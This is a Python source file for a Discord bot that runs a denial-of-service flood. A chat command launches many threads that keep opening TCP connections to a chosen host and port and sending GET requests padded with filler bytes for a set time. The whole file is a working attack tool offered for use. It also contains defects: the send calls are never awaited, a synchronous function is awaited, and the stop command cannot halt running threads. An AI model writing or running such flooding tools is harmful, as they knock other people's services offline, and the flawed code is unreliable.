import discord
from discord.ext import commands
import socket
import threading
import time

# Create an Intents object
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='.', intents=intents)

# Function to send TCP requests
def send_tcp_requests(target_ip, port, bytes_to_send, stop_event):
    while not stop_event.is_set():
        try:
            # Create a TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect to the target
            s.connect((target_ip, port))

            # Send a TCP request
            request = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"
            request += b"A" * bytes_to_send  # Add the specified number of bytes to the request
            s.send(request)

            # Close the socket
            s.close()

        except Exception as e:
            print("An error occurred:", str(e))
            break

# Function to start the attack
def start_attack(ctx, ip, port, bytes_to_send, num_threads, connections_per_thread, duration):
    try:
        # Resolve domain to IP address
        target_ip = socket.gethostbyname(ip)
    except socket.gaierror as e:
        ctx.send("Failed to resolve domain. Error: " + str(e))
        return

    # Create a stop event
    stop_event = threading.Event()

    # Start the threads
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=send_tcp_requests, args=(target_ip, port, bytes_to_send, stop_event))
        t.start()
        threads.append(t)

    # Send a message to indicate the attack has started
    embed = discord.Embed(title="Attack Started", description=f"Attacking {ip}:{port} with {num_threads} threads and {connections_per_thread} connections per thread.", color=discord.Color.green())
    ctx.send(embed=embed)

    # Wait for the specified duration
    time.sleep(duration)

    # Set the stop event to stop the threads
    stop_event.set()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    # Send a message to indicate the attack has stopped
    embed = discord.Embed(title="Attack Stopped", description=f"Stopped attacking {ip}:{port}.", color=discord.Color.red())
    ctx.send(embed=embed)

# Command to start the attack
@bot.command()
async def attack(ctx, ip: str, port: int, bytes_to_send: int, num_threads: int, connections_per_thread: int, duration: int):
    await start_attack(ctx, ip, port, bytes_to_send, num_threads, connections_per_thread, duration)

# Command to stop the attack
@bot.command()
async def stop(ctx):
    # Create a stop event
    stop_event = threading.Event()

    # Set the stop event to stop the threads
    stop_event.set()

    # Send a message to indicate the attack has stopped
    embed = discord.Embed(title="Attack Stopped", description="Stopped the current attack.", color=discord.Color.red())
    ctx.send(embed=embed)

# Replace 'your_bot_token' with your actual bot token
bot.run('')
